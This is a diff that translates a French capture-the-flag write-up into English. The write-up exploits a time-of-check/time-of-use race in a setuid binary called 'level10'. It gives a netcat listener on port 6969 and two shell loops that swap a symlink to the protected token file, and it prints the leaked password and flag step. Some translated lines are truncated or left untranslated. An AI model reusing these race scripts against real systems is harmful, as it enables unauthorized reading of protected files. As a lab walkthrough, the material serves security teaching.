@@ -1,4 +1,4 @@
-On trouve dans le dossier **home** un fichier **token** et un binaire **level10** qui, si on le lance nous affiche un message :
+We find in the **home** folder a **token** file and a **level10** binary which, if we launch it, displays a :
 <pre><code>> ./level10
 ./level10 file host
 		sends file to host if you have access to it
@@ -6,15 +6,15 @@ On trouve dans le dossier **home** un fichier **token** et un binaire **level10*
 > ./level10 token IP
 You don't have access to token
 </code></pre>
-> On suppose que l'host est l'ip sur laquelle la machine tourne (<code>ifconfig</code>)
+> It is assumed that the host is the ip on which the machine is running (<code>ifconfig</code>)
 
-On créé un fichier dans /tmp qui aura nos droits, et qui pourra donc être envoyé :
+We create a file in /tmp which will have our rights, and which can be sent :
 <pre><code>> echo "test" > /tmp/test
 > ./level10 /tmp/test IP
 Connecting to IP:6969 .. Unable to connect to host IP
 </code></pre>
 
-On cherche à savoir ce qu'il se passe dans le binaire avec un fichier valide :
+We try to find out what happens in the binary with a valid :
 <pre><code>> ltrace ./level10 /tmp/test IP
 __libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
 access("/tmp/test", 4)= 0
@@ -29,29 +29,28 @@ exit(1 <unfinished ...>
 +++ exited (status 1) +++
 </code></pre>
 
-On observe que la commande **access** est utilisée, or on sait grâce à son man, que cette commande possède une faille
+We can see that the **access** command is used, but we know from the man that this command has a flaw
 <pre>
 Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and  opening  the file to manipulate it.
 </pre>
 > Cette faille se nomme la **race-condition-vulnerability**.
 
-De plus on observe la tentative de connexion au port 6969 qui n'est pas actif
-Pour que les requêtes ce fassent, il faut donc écouter le port grâce à :
+In addition, there is an attempt to connect to port 6969, which is not active
+In order for the requests to do so, you have to listen to the port with :
 <pre><code>> nc -lk 6969</code></pre>
-Et si on relance notre commande:
+And if we re-launch our order :
 <pre><code>> ./level10 /tmp/test IP
 Connecting to IP:6969 .. Connected!
 Sending file .. wrote file!</code></pre>
-> Il faut 2 terminaux pour effectuer cette manipulation afin de voir le résultat de l'écoute qui, dans cet exemple, nous donne :
+> It takes 2 terminals to perform this manipulation in order to see the result of the listening which, in this example, gives us :
 > <pre><code>.*( )*.
 > test</code></pre>
 
-
-On va donc chercher à exploiter la **race-condition-vulnerability**, avec 2 scripts:
+So we will try to exploit the **race-condition-vulnerability**, with 2 scripts:
 
 ### /tmp/loop.sh
 ```bash
-# Ce script lance la requete d'envoie de fichier en boucle
+# This script launches the request to send a file in a loop
 while true;
 do
 	/home/user/level10/level10 /tmp/link IP > /dev/null
@@ -61,7 +60,7 @@ done
 
 ### /tmp/ln.sh
 ```bash
-# Ce script creer un fichier sur lequel on a les droits et fait un lien symbolique du fichier token en boucle
+# This script creates a file on which we have the rights and makes a symbolic link of the token file in a loop
 while true;
 do
 	rm -f /tmp/link
@@ -72,7 +71,7 @@ done
 ```
 > <code>printf "while true;\ndo\n\trm -f /tmp/link\n\ttouch /tmp/link\n\trm -f /tmp/link\n\tln -s /home/user/level10/token /tmp/link\ndone\n" > /tmp/ln.sh</code>
 
-Il suffit de lancer les deux en background et de regarder le deuxième terminal qui écoute le port 6969 en attendant les deux scripts s'exécute de manière assez proche pour que la **race-condition-vulnerability** soit exploitée :
+Just run both in the background and watch the second terminal listening to port 6969 while waiting for the two scripts to run close enough for the **race-condition-vulnerability** to be exploited :
 <pre><code>> sh /tmp/loop.sh &
 > sh /tmp/ln.sh &
 </code></pre>
@@ -84,13 +83,13 @@ woupa2yuojeeaaed06riuj63c
 ...
 </code></pre>
 
-On teste le mot de passe :
+We test the password :
 <pre>
 <code>> su flag10</code>
 <code>Password: woupa2yuojeeaaed06riuj63c</code>
 </pre>
 
-On obtient la phrase magique **Don't forget to launch getflag !**
+You get the magic phrase **Don't forget to launch getflag !**
 
 <pre>
 <code>> getflag</code>
